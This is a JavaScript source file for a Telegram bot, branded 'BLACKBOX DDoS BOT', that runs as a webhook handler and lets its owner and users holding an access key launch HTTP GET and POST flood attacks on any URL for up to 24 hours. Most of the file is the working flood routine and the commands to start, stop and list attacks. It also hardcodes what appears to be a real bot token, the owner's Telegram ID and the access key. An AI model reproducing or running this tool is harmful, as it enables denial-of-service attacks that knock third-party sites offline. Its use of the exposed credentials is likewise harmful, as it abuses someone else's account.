import fetch from 'node-fetch'

// ===== CONFIG =====
const BOT_TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc'
const OWNER_ID = 6629230649
const ACCESS_KEY = '123RJhTtApALhaT'

// ===== STATE =====
const users = new Set([OWNER_ID])
const attacks = new Map()
const userData = new Map() // Simpan data user

// ===== HELPER FUNCTIONS =====
async function sendTG(chatId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text,
        parse_mode: 'HTML'
      })
    })
  } catch(e) {}
}

async function saveUser(userId, userInfo) {
  userData.set(userId, {
    first_name: userInfo.first_name || '',
    username: userInfo.username || '',
    joined: new Date().toISOString()
  })
}

async function startDDoS(target, seconds, chatId, attackId, method = 'MIX') {
  const startTime = Date.now()
  const endTime = startTime + (seconds * 1000)
  let requestCount = 0
  
  // Methods
  const methods = {
    'HTTP': () => fetch(target, { method: 'GET', signal: AbortSignal.timeout(2000) }),
    'POST': () => fetch(target, { 
      method: 'POST', 
      body: JSON.stringify({ flood: Date.now() }),
      signal: AbortSignal.timeout(2000)
    }),
    'RANDOM': () => fetch(target, { 
      method: Math.random() > 0.5 ? 'GET' : 'POST',
      signal: AbortSignal.timeout(2000)
    })
  }
  
  // Worker per method
  let methodsToUse = []
  if (method === 'MIX') methodsToUse = ['HTTP', 'POST', 'RANDOM']
  else methodsToUse = [method]
  
  // Create multiple workers
  const workers = []
  for (let i = 0; i < 10; i++) {
    const worker = setInterval(async () => {
      if (Date.now() > endTime) {
        clearInterval(worker)
        return
      }
      
      try {
        const selectedMethod = methodsToUse[Math.floor(Math.random() * methodsToUse.length)]
        await methods[selectedMethod]().catch(() => {})
        requestCount++
      } catch(e) {}
    }, 50) // 50ms interval
    
    workers.push(worker)
  }
  
  attacks.set(attackId, {
    workers,
    chatId,
    target,
    method,
    startTime,
    requestCount: 0
  })
  
  // Update counter
  const counter = setInterval(() => {
    const attack = attacks.get(attackId)
    if (attack) attack.requestCount = requestCount
  }, 1000)
  
  // Auto stop
  setTimeout(() => {
    const attack = attacks.get(attackId)
    if (attack) {
      attack.workers.forEach(w => clearInterval(w))
      clearInterval(counter)
      attacks.delete(attackId)
      
      const duration = (Date.now() - attack.startTime) / 1000
      sendTG(chatId,
        `✅ ATTACK FINISHED\n\n` +
        `ID: <code>${attackId}</code>\n` +
        `Target: ${target}\n` +
        `Duration: ${duration.toFixed(1)}s\n` +
        `Requests: ${requestCount}\n` +
        `RPS: ${(requestCount/duration).toFixed(1)}`
      )
    }
  }, seconds * 1000)
}

// ===== COMMAND HANDLERS =====
async function handleCommand(chatId, text, chatType, from) {
  const userId = from.id
  const isOwner = userId === OWNER_ID
  const isUser = users.has(userId)
  
  // Save user data
  if (chatType === 'private') {
    saveUser(userId, from)
  }
  
  // ===== MENU & HELP =====
  if (text === '/start') {
    let menu = `⚡ <b>BLACKBOX DDoS BOT</b>\n`
    menu += `┌─────────────────\n`
    menu += `│ User ID: <code>${userId}</code>\n`
    menu += `│ Status: ${isOwner ? '👑 OWNER' : isUser ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n`
    menu += `│ Users: ${users.size}\n`
    menu += `│ Attacks: ${attacks.size}\n`
    menu += `└─────────────────\n\n`
    
    menu += `<b>MAIN COMMANDS:</b>\n`
    menu += `• /menu - Show this menu\n`
    menu += `• /ping - Test response\n`
    menu += `• /methods - Attack methods\n`
    
    if (isOwner || isUser) {
      menu += `\n<b>ATTACK COMMANDS:</b>\n`
      menu += `• /attack [url] [seconds] [method]\n`
      menu += `• /stop [id]\n`
      menu += `• /mystats - Your stats\n`
    }
    
    if (!isOwner && !isUser) {
      menu += `\n<b>ACCESS:</b>\n`
      menu += `• /key ${ACCESS_KEY} - Unlock bot\n`
    }
    
    if (isOwner) {
      menu += `\n<b>OWNER COMMANDS:</b>\n`
      menu += `• /users - List all users\n`
      menu += `• /add [id] - Add user\n`
      menu += `• /remove [id] - Remove user\n`
      menu += `• /allattacks - Show all attacks\n`
    }
    
    await sendTG(chatId, menu)
  }
  
  else if (text === '/menu') {
    await sendTG(chatId, '📋 Opening menu...')
    handleCommand(chatId, '/start', chatType, from)
  }
  
  else if (text === '/ping') {
    const start = Date.now()
    await sendTG(chatId, '🏓 Testing response...')
    const latency = Date.now() - start
    await sendTG(chatId, `⏱️ Response time: <code>${latency}ms</code>`)
  }
  
  else if (text === '/methods') {
    const methodsText = `⚡ <b>ATTACK METHODS</b>\n\n`
      + `• <code>HTTP</code> - GET request flood\n`
      + `• <code>POST</code> - POST data flood\n`
      + `• <code>RANDOM</code> - Random methods\n`
      + `• <code>MIX</code> - All methods (default)\n\n`
      + `<b>Examples:</b>\n`
      + `<code>/attack https://target.com 60 MIX</code>\n`
      + `<code>/attack https://target.com 120 HTTP</code>\n`
      + `<code>/attack https://target.com 300 POST</code>\n\n`
      + `Max duration: 24 hours\nNo request limit`
    
    await sendTG(chatId, methodsText)
  }
  
  else if (text.startsWith('/key')) {
    const key = text.split(' ')[1]
    
    if (isOwner) {
      await sendTG(chatId, '👑 Owner tidak perlu key')
      return
    }
    
    if (key === ACCESS_KEY) {
      users.add(userId)
      await sendTG(chatId, 
        `✅ <b>ACCESS GRANTED!</b>\n\n` +
        `User ID: <code>${userId}</code>\n` +
        `Status: AUTHORIZED\n\n` +
        `Now you can use:\n` +
        `• /attack - Start DDoS\n` +
        `• /stop - Stop attack\n` +
        `• /mystats - Your stats`
      )
    } else {
      await sendTG(chatId, '❌ Invalid access key')
    }
  }
  
  else if (text.startsWith('/attack')) {
    if (!isOwner && !isUser) {
      await sendTG(chatId, '❌ Not authorized\nUse /key first')
      return
    }
    
    const parts = text.split(' ')
    if (parts.length < 3) {
      await sendTG(chatId, '❌ Format: /attack [url] [seconds] [method]\nExample: /attack https://site.com 60 MIX')
      return
    }
    
    const url = parts[1]
    const seconds = parseInt(parts[2])
    const method = (parts[3] || 'MIX').toUpperCase()
    
    // Validasi
    if (!url.startsWith('http')) {
      await sendTG(chatId, '❌ Invalid URL\nUse http:// or https://')
      return
    }
    
    if (seconds < 1 || seconds > 86400) {
      await sendTG(chatId, '❌ Duration: 1-86400 seconds (24 hours max)')
      return
    }
    
    const validMethods = ['HTTP', 'POST', 'RANDOM', 'MIX']
    if (!validMethods.includes(method)) {
      await sendTG(chatId, `❌ Invalid method\nUse: ${validMethods.join(', ')}`)
      return
    }
    
    const attackId = Math.random().toString(36).substring(2, 8).toUpperCase()
    
    await sendTG(chatId,
      `🚀 <b>ATTACK LAUNCHED!</b>\n\n` +
      `┌─────────────────\n` +
      `│ ID: <code>${attackId}</code>\n` +
      `│ Target: ${url}\n` +
      `│ Duration: ${seconds}s\n` +
      `│ Method: ${method}\n` +
      `│ User: <code>${userId}</code>\n` +
      `└─────────────────\n\n` +
      `To stop: <code>/stop ${attackId}</code>`
    )
    
    startDDoS(url, seconds, chatId, attackId, method)
  }
  
  else if (text.startsWith('/stop')) {
    const attackId = text.split(' ')[1]?.toUpperCase()
    
    if (!attackId) {
      await sendTG(chatId, '❌ Format: /stop [attack_id]')
      return
    }
    
    const attack = attacks.get(attackId)
    if (!attack) {
      await sendTG(chatId, '❌ Attack not found')
      return
    }
    
    if (attack.chatId !== chatId && !isOwner) {
      await sendTG(chatId, '❌ You can only stop your own attacks')
      return
    }
    
    attack.workers.forEach(w => clearInterval(w))
    attacks.delete(attackId)
    
    const duration = (Date.now() - attack.startTime) / 1000
    await sendTG(chatId,
      `🛑 <b>ATTACK STOPPED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Duration: ${duration.toFixed(1)}s\n` +
      `Target: ${attack.target}\n` +
      `Method: ${attack.method}`
    )
  }
  
  else if (text === '/mystats') {
    if (!isOwner && !isUser) {
      await sendTG(chatId, '❌ Not authorized')
      return
    }
    
    const userAttacks = Array.from(attacks.entries())
      .filter(([id, attack]) => attack.chatId === chatId)
    
    const userInfo = userData.get(userId) || {}
    
    let stats = `📊 <b>YOUR STATS</b>\n`
    stats += `┌─────────────────\n`
    stats += `│ ID: <code>${userId}</code>\n`
    stats += `│ Name: ${userInfo.first_name || 'N/A'}\n`
    stats += `│ Username: @${userInfo.username || 'N/A'}\n`
    stats += `│ Joined: ${userInfo.joined ? new Date(userInfo.joined).toLocaleDateString() : 'N/A'}\n`
    stats += `│ Active Attacks: ${userAttacks.length}\n`
    stats += `└─────────────────\n\n`
    
    if (userAttacks.length > 0) {
      stats += `<b>ACTIVE ATTACKS:</b>\n`
      userAttacks.forEach(([id, attack]) => {
        const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
        stats += `• <code>${id}</code> - ${attack.target} (${duration}s)\n`
      })
    }
    
    await sendTG(chatId, stats)
  }
  
  else if (text === '/users' && isOwner) {
    let userList = `👥 <b>TOTAL USERS: ${users.size}</b>\n\n`
    
    Array.from(users).forEach((id, index) => {
      const info = userData.get(id) || {}
      const name = info.first_name ? `- ${info.first_name}` : ''
      const username = info.username ? `@${info.username}` : ''
      userList += `${index + 1}. <code>${id}</code> ${name} ${username}\n`
    })
    
    await sendTG(chatId, userList)
  }
  
  else if (text.startsWith('/add') && isOwner) {
    const newId = parseInt(text.split(' ')[1])
    if (newId) {
      users.add(newId)
      await sendTG(chatId, `✅ Added user <code>${newId}</code>`)
      await sendTG(newId, '🎉 You have been added by owner!\nUse /start to begin')
    }
  }
  
  else if (text.startsWith('/remove') && isOwner) {
    const removeId = parseInt(text.split(' ')[1])
    if (removeId) {
      users.delete(removeId)
      await sendTG(chatId, `❌ Removed user <code>${removeId}</code>`)
    }
  }
  
  else if (text === '/allattacks' && isOwner) {
    if (attacks.size === 0) {
      await sendTG(chatId, '📭 No active attacks')
      return
    }
    
    let attackList = `⚡ <b>ACTIVE ATTACKS: ${attacks.size}</b>\n\n`
    
    attacks.forEach((attack, id) => {
      const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
      attackList += `• <code>${id}</code>\n`
      attackList += `  Target: ${attack.target}\n`
      attackList += `  Duration: ${duration}s\n`
      attackList += `  Method: ${attack.method}\n`
      attackList += `  User: <code>${attack.chatId}</code>\n`
      attackList += `  Stop: <code>/stop ${id}</code>\n\n`
    })
    
    await sendTG(chatId, attackList)
  }
  
  else {
    // Unknown command
    await sendTG(chatId, '❌ Unknown command\nUse /start for menu')
  }
}

// ===== MAIN HANDLER =====
export default async function handler(req, res) {
  // GET untuk test
  if (req.method === 'GET') {
    return res.status(200).json({ 
      status: 'BLACKBOX ACTIVE',
      owner: OWNER_ID,
      users: users.size,
      attacks: attacks.size,
      uptime: process.uptime()
    })
  }
  
  // POST dari Telegram Webhook
  if (req.method === 'POST') {
    try {
      const update = req.body
      
      if (update.message) {
        const chatId = update.message.chat.id
        const text = update.message.text || ''
        const from = update.message.from || {}
        const chatType = update.message.chat.type
        
        // Process command
        await handleCommand(chatId, text, chatType, from)
      }
      
      return res.status(200).json({ ok: true })
    } catch (error) {
      console.log('Handler error:', error)
      return res.status(200).json({ ok: true }) // Tetap return 200 ke Telegram
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' })
  }
